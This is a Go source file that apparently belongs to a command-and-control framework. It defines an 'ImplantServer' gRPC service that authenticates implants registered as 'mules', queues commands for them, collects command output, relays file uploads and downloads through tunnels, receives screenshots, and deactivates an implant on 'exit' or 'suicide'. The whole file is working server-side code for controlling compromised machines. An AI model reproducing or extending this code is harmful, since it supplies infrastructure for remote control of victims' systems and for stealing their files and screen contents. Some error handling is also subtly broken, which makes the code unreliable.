package lib


import(
  //"os"
  "fmt"
  "errors"
  "context"
  //"io/ioutil"
  "github.com/alphamystic/odin/lib/core"
  "github.com/alphamystic/odin/lib/utils"
  //"github.com/alphamystic/odin/lib/penguins/zoo"
  "github.com/alphamystic/odin/wheagle/server/grpcapi"
)

type ImplantServer struct{
  ICave *core.Cave
  Config *MSRunner
  IPillar *Pillar
  OS string
}

func NewImplantServer(cave *core.Cave,config *MSRunner,pillar *Pillar) *ImplantServer{
  srv := &ImplantServer{
    ICave: cave,
    Config:config,
    IPillar: pillar,
    OS: utils.GetCurrentOS(),
  }
  return srv
}


func (srv *ImplantServer) FetchCommand(ctx context.Context, empty *grpcapi.Command) (*grpcapi.Command,error){
  var cmd = new(grpcapi.Command)
  fmt.Println("Getting work for ",empty.UserId)
  cmd,err := srv.IPillar.GetWork(empty)
  if err != nil {
    if errors.Is(err,ErrNoWork){
      return cmd,nil
    }
    utils.Logerror(err)
  }
  return cmd,nil
}

func (srv *ImplantServer) RunAuthentication(ctx context.Context, auth *grpcapi.Auth) (*grpcapi.Auth,error){
  //var res *grpcapi.Auth
  if srv.Config.MSId == auth.MSId {
    utils.PrintTextInASpecificColorInBold("yellow","Authenticated "+auth.UserId)
    auth.Authenticated = true
    _ = srv.IPillar.NewPool(auth.UserId)
    err := srv.Config.ADDMule(auth.UserId,auth.MSId)
    if err != nil {
      if err == fmt.Errorf("Mule with ID %v already exists",errors.New(auth.UserId)){
        return auth,nil
      } else {
        utils.Logerror(err)
        return auth,nil
      }
    }
  } else {
    auth.Authenticated = false
  }
  return auth,nil
}

func (srv *ImplantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty,error) {
  fmt.Println("User id from result: ",result.UserId)
  if err := srv.IPillar.MarkAsDone(result); err != nil{
    utils.Logerror(err)
    return &grpcapi.Empty{},nil
  }
  if result.In == "exit" || result.In == "suicide"{
    _ = srv.IPillar.ClearOut(result.UserId)
    if err := srv.IPillar.Deactivate(result);err != nil{
      utils.Logerror(err)
      return &grpcapi.Empty{},nil
    }
  }
  fmt.Println("writing to send output: ",result.Out)
  //srv.Output <- result
  return &grpcapi.Empty{},nil
}


func (srv *ImplantServer) ReceiveUpload(ctx context.Context, in *grpcapi.Command) (*grpcapi.File, error){
  var fl = new(grpcapi.File)
  tunnelIn,err := srv.ICave.GetTunnel(in.Out)
  if err != nil{
    return nil,err
  }
  val,ok := <-tunnelIn.Data
  if !ok {
    return nil,errors.New("Errror reading data from channel.")
  }
  fl,ok = val.(*grpcapi.File)
  if !ok {
    return nil,errors.New("Error asserting ito file.")
  }
  return fl,nil
}

func (srv *ImplantServer) SendUploadReport(ctx context.Context, in *grpcapi.FileMessage) (*grpcapi.Empty, error){
  tunnelOut,err := srv.ICave.GetTunnel(in.Name)
  if err != nil{
    return nil,err
  }
  tunnelOut.Data <- in
  return &grpcapi.Empty{},nil
}

func (srv *ImplantServer) SendDownload(ctx context.Context, in *grpcapi.File) (*grpcapi.Empty, error){
  // get the tunnel out data  (let operator id be the tunnel id)
  tunnelOut,err := srv.ICave.GetTunnel(in.Name)
  if err != nil {
    return nil,err
  }
  tunnelOut.Data <- in
  // write the file incide it
  return &grpcapi.Empty{},nil
}

func (srv *ImplantServer) TakeScreenShot(ctx context.Context, in *grpcapi.Screenshots) (*grpcapi.Empty, error){
  //write screenshots into a tunnel
  tunnel,err := srv.ICave.GetTunnel(in.UserId)
  if err != nil{
    return nil,err
  }
  tunnel.Data <- in
  return &grpcapi.Empty{},nil
}
